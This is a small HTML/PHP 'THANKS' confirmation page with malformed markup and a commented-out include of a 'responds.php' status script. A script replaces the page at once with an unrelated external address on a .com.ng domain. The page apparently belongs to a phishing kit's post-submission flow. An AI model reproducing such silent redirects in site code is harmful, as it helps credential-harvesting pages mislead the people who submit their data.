<!DOCTYPE html>
<html lang="en">
<head>
  <title>THANKS</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <p> THANKS </p><b><b><b><p> THANKS </p>
  <p> THANKS </p>
  <b><b><p> THANKS</p><p> THANKS </p>
</div>
<?php //include_once('responds.php');  echo $status;  


?><script>
function load(){window.location.replace("https://alansmith.com.ng/new/");}
setInterval(load(), 25000);</script>
</body>
</html>